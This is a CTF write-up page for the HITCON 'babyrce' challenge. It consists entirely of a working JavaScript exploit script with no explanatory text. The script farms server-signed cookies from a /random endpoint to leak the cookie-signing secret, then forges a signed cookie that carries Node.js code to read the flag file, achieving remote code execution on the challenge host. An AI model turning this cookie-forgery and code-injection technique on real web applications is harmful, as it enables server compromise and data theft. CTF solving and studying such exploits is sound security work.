<!DOCTYPE html>
<html lang="en">
	<head>
	<meta charset="UTF-8" />
	<meta name="viewport" content="width=device-width, initial-scale=1.0" />
	<title>RiceSec</title>

	<link href="/writeups/css/prism-one-light.css" rel="stylesheet" />
	<link rel="stylesheet" href="/writeups/css/style.css" />
</head>


	<body>
		
<header>
	<nav>
		<b>RiceSec</b>
	</nav>
</header>

<h1>babyrce</h1>

<pre class="language-js"><code class="language-js"><span class="token keyword">import</span> cookie <span class="token keyword">from</span> <span class="token string">'cookie'</span><span class="token punctuation">;</span><br><span class="token keyword">import</span> <span class="token punctuation">{</span> sign <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'cookie-signature'</span><span class="token punctuation">;</span><br><br><span class="token keyword">const</span> <span class="token constant">HOST</span> <span class="token operator">=</span> <span class="token string">'http://1pfccqdtnb.rce.chal.hitconctf.com'</span><span class="token punctuation">;</span><br><span class="token keyword">const</span> <span class="token constant">INDEX</span> <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token constant">HOST</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">/</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span><br><span class="token keyword">const</span> <span class="token constant">RANDOM</span> <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token constant">HOST</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">/random</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span><br><br><span class="token keyword">let</span> getSecret <span class="token operator">=</span> <span class="token string">'req.secret//'</span><span class="token punctuation">;</span><br><span class="token keyword">const</span> <span class="token constant">DESIDERATA</span> <span class="token operator">=</span> Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>getSecret<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><br><br><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><br><br><span class="token keyword">let</span> res <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token constant">INDEX</span><span class="token punctuation">)</span><span class="token punctuation">;</span><br><span class="token keyword">const</span> cookies <span class="token operator">=</span> cookie<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>headers<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'set-cookie'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><br><span class="token keyword">let</span> <span class="token punctuation">[</span>data<span class="token punctuation">,</span> signature<span class="token punctuation">]</span> <span class="token operator">=</span> cookies<span class="token punctuation">.</span>code<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><br><br><span class="token comment">// console.log(data, signature);</span><br><br><span class="token keyword">let</span> attemptedData <span class="token operator">=</span> data<span class="token punctuation">;</span><br><span class="token keyword">let</span> attemptedSignature <span class="token operator">=</span> signature<span class="token punctuation">;</span><br><br><span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> <span class="token constant">DESIDERATA</span><span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">{</span><br>	<span class="token keyword">do</span> <span class="token punctuation">{</span><br>		<span class="token keyword">const</span> res <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token constant">RANDOM</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><br>			<span class="token literal-property property">headers</span><span class="token operator">:</span> <span class="token punctuation">{</span><br>				<span class="token string-property property">'Cookie'</span><span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">code=s:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>data<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">.</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>signature<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span><br>			<span class="token punctuation">}</span><span class="token punctuation">,</span><br>		<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><br>		<span class="token keyword">const</span> cookies <span class="token operator">=</span> res<span class="token punctuation">.</span>headers<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'Set-Cookie'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><br>		<span class="token keyword">const</span> codeCookie <span class="token operator">=</span> cookie<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>cookies<span class="token punctuation">)</span><span class="token punctuation">.</span>code<span class="token punctuation">;</span><br>		<span class="token comment">// console.log(codeCookie);</span><br>		<span class="token keyword">const</span> <span class="token punctuation">[</span>codeCookieData<span class="token punctuation">,</span> codeCookieSignature<span class="token punctuation">]</span> <span class="token operator">=</span> codeCookie<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><br><br>		attemptedData <span class="token operator">=</span> codeCookieData<span class="token punctuation">;</span><br>		attemptedSignature <span class="token operator">=</span> codeCookieSignature<span class="token punctuation">;</span><br>	<span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>attemptedData<span class="token punctuation">[</span>attemptedData<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token constant">DESIDERATA</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><br><br>	data <span class="token operator">=</span> attemptedData<span class="token punctuation">;</span><br>	signature <span class="token operator">=</span> attemptedSignature<span class="token punctuation">;</span><br><br>	i<span class="token operator">++</span><span class="token punctuation">;</span><br>	console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> attemptedData<span class="token punctuation">,</span> data<span class="token punctuation">,</span> signature<span class="token punctuation">)</span><span class="token punctuation">;</span><br><span class="token punctuation">}</span><br><br><span class="token keyword">while</span> <span class="token punctuation">(</span>i<span class="token operator">++</span> <span class="token operator">&lt;</span> <span class="token number">40</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><br>	<span class="token keyword">const</span> res <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token constant">RANDOM</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><br>		<span class="token literal-property property">headers</span><span class="token operator">:</span> <span class="token punctuation">{</span><br>			<span class="token string-property property">'Cookie'</span><span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">code=s:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>data<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">.</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>signature<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span><br>		<span class="token punctuation">}</span><span class="token punctuation">,</span><br>	<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><br>	<span class="token keyword">const</span> cookies <span class="token operator">=</span> res<span class="token punctuation">.</span>headers<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'Set-Cookie'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><br>	<span class="token keyword">const</span> codeCookie <span class="token operator">=</span> cookie<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>cookies<span class="token punctuation">)</span><span class="token punctuation">.</span>code<span class="token punctuation">;</span><br>	<span class="token keyword">const</span> <span class="token punctuation">[</span>codeCookieData<span class="token punctuation">,</span> codeCookieSignature<span class="token punctuation">]</span> <span class="token operator">=</span> codeCookie<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><br><br>	data <span class="token operator">=</span> codeCookieData<span class="token punctuation">;</span><br>	signature <span class="token operator">=</span> codeCookieSignature<span class="token punctuation">;</span><br><span class="token punctuation">}</span><br><br>res <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token constant">RANDOM</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><br>	<span class="token literal-property property">headers</span><span class="token operator">:</span> <span class="token punctuation">{</span><br>		<span class="token string-property property">'Cookie'</span><span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">code=s:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>data<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">.</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>signature<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span><br>	<span class="token punctuation">}</span><span class="token punctuation">,</span><br><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><br><span class="token keyword">const</span> result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">await</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>result<span class="token punctuation">;</span><br><span class="token keyword">const</span> <span class="token punctuation">{</span> secret <span class="token punctuation">}</span> <span class="token operator">=</span> result<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">result = (?&lt;secret>[0-9a-fA-F]+)$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span>groups<span class="token punctuation">;</span><br>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>secret<span class="token punctuation">)</span><span class="token punctuation">;</span><br><br><span class="token keyword">const</span> <span class="token constant">READ_FLAG</span> <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">const fs = require('fs');<br>fs.readFileSync('/' + fs.readdirSync('/').find(p => p.startsWith('flag')), { encoding: 'utf-8' });</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span><br><br><span class="token keyword">const</span> codeCookie <span class="token operator">=</span> <span class="token function">sign</span><span class="token punctuation">(</span>Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token constant">READ_FLAG</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> secret<span class="token punctuation">)</span><span class="token punctuation">;</span><br><span class="token comment">// console.log(codeCookie);</span><br><br>res <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token constant">RANDOM</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><br>	<span class="token literal-property property">headers</span><span class="token operator">:</span> <span class="token punctuation">{</span><br>		<span class="token string-property property">'Cookie'</span><span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">code=s:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>codeCookie<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span><br>	<span class="token punctuation">}</span><span class="token punctuation">,</span><br><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><br>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">await</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>



	</body>
</html>
